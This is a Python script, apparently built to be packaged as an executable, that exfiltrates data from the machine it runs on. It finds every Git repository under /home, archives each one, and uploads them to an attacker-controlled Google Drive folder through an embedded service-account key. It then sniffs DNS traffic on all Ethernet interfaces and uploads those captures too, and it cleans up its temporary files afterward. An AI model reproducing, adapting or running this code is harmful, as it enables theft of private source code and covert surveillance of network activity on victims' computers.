import datetime
from datetime import date
from itertools import count
import re
import subprocess
import sys
import scapy.all as scapy
from scapy.layers import http
import shutil, os
import tarfile
from googleapiclient.discovery import build
from oauth2client.service_account import ServiceAccountCredentials
from httplib2 import Http
from googleapiclient.http import MediaFileUpload
import uuid
import scapy.all as scapy
from scapy.sendrecv import AsyncSniffer
from time import sleep

def app_path():
    if getattr(sys, 'frozen', False):
        app_path = os.path.dirname(sys.executable)
    elif __file__:
        app_path = os.path.dirname(__file__)
    return app_path

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

cwd=os.getcwd()
scopes = ['https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name(resource_path('finalkey.json'), scopes)
driveService = build('drive', 'v3', credentials=creds)
parentDir='1cfjlBcYJPEdcHBoc3aa94zPvnUfJTCSm'
UUID=hex(uuid.getnode())
mime_types={'folder':'application/vnd.google-apps.folder','text':'text/plain','pcap':'application/vnd.tcpdump.pcap'}
today=date.today()
date_folder_name=today.strftime("%d_%m_%Y")
snifferList=list()
interfaces=list()
    
def get_platform():
	return sys.platform


def build_interfaces(platform):
    global interfaces
    interfaces = scapy.get_if_list()
    #MACOS
    if platform=="darwin": 
        interfaces= [i for i in interfaces if 'en' in i or 'eth' in i]
    else: #Linux
        interfaces= [i for i in interfaces if 'en' in i or 'eth' in i]
    return interfaces

def sniff(toggle):

    global snifferList
    global interfaces

    platform=get_platform()
    print("Platform is",platform)
    interfaces=build_interfaces(platform)
    print("Interfaces on this platform are",interfaces)
    
    if (toggle==1):
        if (len(snifferList))!=0:
            print("I am already sniffing!")
            return
        print("Starting the packet sniffer!")

        for i in range(len(interfaces)):
            try:
                t=AsyncSniffer(iface=interfaces[i],filter="port 53",count=0)
                #capture=scapy.sniff(iface=i,filter="port 53",count=10)
                print("Capturing on interface {}".format(interfaces[i]))
                t.start()
                snifferList.append(t)
            except:
                pass
    else:
        if (len(snifferList)==0):
            print("I have not sniffed anything!")
            return

        print("Stopping the packet sniffer!")
        try:
            os.system('mkdir /tmp/captures 2>/dev/null')
        except:
        #Dir exists
            pass

        for i in range(len(interfaces)):

            try:
                print("Stopping capture on interface {}".format(interfaces[i]))
            
                capture=snifferList[i].stop()
                snifferList.remove(snifferList[i])
                now = datetime.datetime.now()
                capName=now.strftime("%Y_%m_%d_%H_%M_%S")+interfaces[i]
                dest_folder="/tmp/captures/{}.pcap".format(capName)
                scapy.wrpcap(dest_folder,capture, append=True)
                uploadToDrive(dest_folder,mime_types['pcap']) 
                os.remove(dest_folder)
            except:
                pass
        try:
            os.rmdir('/tmp/captures')
        except:
            pass
        
    return
    
def tardir(repository, dest_folder):
    #print(dest_folder)
    with tarfile.open(dest_folder, mode='w:gz') as archive:
        archive.add(repository, recursive=True)
    return

def searchFile(fileName,mimeType,parentID):
    page_token=None
    while True:
        query="mimeType= '{}' and name contains '{}' and '{}' in parents".format(mimeType,fileName,parentID)
        #print(query)
        response = driveService.files().list(q=query,
                                            spaces='drive',
                                            fields='nextPageToken, files(id, name)',
                                            pageToken=page_token).execute()

        if len(response.get('files', [])) != 0:
            file=response.get('files', [])[0]
            #print("File is present! Name={} : ID={}".format(file.get('name'),file.get('id')))
            return file.get('id')

        page_token = response.get('nextPageToken', None)

        #print("Page token=",page_token)
        if page_token is None:
            break

    return None

def createfile(fileName,mimeType,parent_id):
    file_metadata = {
                    'name' : fileName,
                    'parents' : [parent_id],
                    'mimeType' : mimeType
                    }
    file = driveService.files().create(body=file_metadata,fields='id').execute()
    print("Created Folder=",file.get('id'))
    return file.get('id')


def uploadFile(fileName,mimeType,parent_id):

    metadata = {
        'name': fileName, 
        "parents": [parent_id]
        }
    #Now create the media file upload object and tell it what file to upload,
    #in this case 'test.html'
    media = MediaFileUpload(fileName, mimetype = mimeType)
    #Now we're doing the actual post, creating a new file of the uploaded type
    file = driveService.files().create(body=metadata, media_body=media,fields='id').execute()
    #Because verbosity is nice
    print("Created file '%s' id '%s'." % (file.get('name'), file.get('id')))
    return

def uploadToDrive(fileName,mimeType):
    fileType="pcap" if "pcap" in mimeType else "tar"
    print("Searching for uuid folder!") 
    uuid_folder_id=searchFile(UUID,mime_types['folder'],parentDir)
    if uuid_folder_id==None:
        folderID=createfile(UUID,mime_types['folder'],parentDir)
        print("Created UUID Folder ID=",folderID)
        date_folder_id=createfile(date_folder_name,mime_types['folder'],folderID)
        print("Created Date Folder ID=",date_folder_id)
        type_folder_id=searchFile(fileType,mime_types['folder'],date_folder_id)

        if type_folder_id==None:
            print("Created type Folder ID=",fileType)
            type_folder_id=createfile(fileType,mime_types['folder'],date_folder_id)
            print("Uploading file to type folder!")
            uploadFile(fileName,mimeType,type_folder_id)
        else:
            print("Uploading file to type folder!")
            uploadFile(fileName,mimeType,type_folder_id)
    else:
        date_folder_id=searchFile(date_folder_name,mime_types['folder'],uuid_folder_id)
        if date_folder_id==None:
            date_folder_id=createfile(date_folder_name,mime_types['folder'],uuid_folder_id)
            print("Created Date Folder ID=",date_folder_id)
            type_folder_id=searchFile(fileType,mime_types['folder'],date_folder_id)
            if type_folder_id==None:
                print("Created type Folder ID=",fileType)
                type_folder_id=createfile(fileType,mime_types['folder'],date_folder_id)
                print("Uploading file to type folder!")
                uploadFile(fileName,mimeType,type_folder_id)
        else:
            type_folder_id=searchFile(fileType,mime_types['folder'],date_folder_id)
            if type_folder_id==None:
                print("Created type Folder ID=",fileType)
                type_folder_id=createfile(fileType,mime_types['folder'],date_folder_id)
                print("Uploading file to date folder!")
                uploadFile(fileName,mimeType,type_folder_id)
            else:
                print("Uploading file to date folder!")
                uploadFile(fileName,mimeType,type_folder_id)      
    return

def get_git_repos():

    try:

        os.system('mkdir /tmp/gitFiles 2>/dev/null')
    except:
        pass

    os.chdir('/home')
    #print(os.path.expanduser("~"))
    #os.chdir(os.path.expanduser("~"))

    #Find all Git repositories in the target machine
    try:
        command="find . -type d -exec test -e '{}/.git' \; -print -prune"
    except:
        exit()
    #find . -type d -exec test -e '{}/.git' ';' -print -prune
    ret = subprocess.run(command, capture_output=True, shell=True)
    repositories=ret.stdout.decode().strip()
    print("repos=",repositories)
    
    if len(repositories)==0:
        return

    for repository in repositories.split('\n'):
        print("Obtaining the repository {}".format(repository))               
        path,folder=re.findall(r'(.*)\/(.*)$',repository)[0]
        #print("Path,folder=",path," ",folder)
        #command2='tar -zcf gitFiles/{}.tar.gz ~"{}" 2>/dev/null'.format(folder,repository[1:]) 
        dest_folder="/tmp/gitFiles/"+folder+'.tar.gz'
        try:   
            tardir(repository,dest_folder)
            print("Tarred the file! Uploading to Drive!")
            uploadToDrive(dest_folder,'application/tar')    
            print("Uploading done!")
            os.remove(dest_folder)
        except:
            continue
    try:
        for file in os.listdir("/tmp/gitFiles"):
            os.remove("/tmp/gitFiles/"+file)
    
        os.rmdir('/tmp/gitFiles')
    except:
        pass
    os.chdir(cwd)
    return 

if __name__ == '__main__':
    
    get_git_repos()
    sniff(1)
    sleep(40)
    sniff(0)
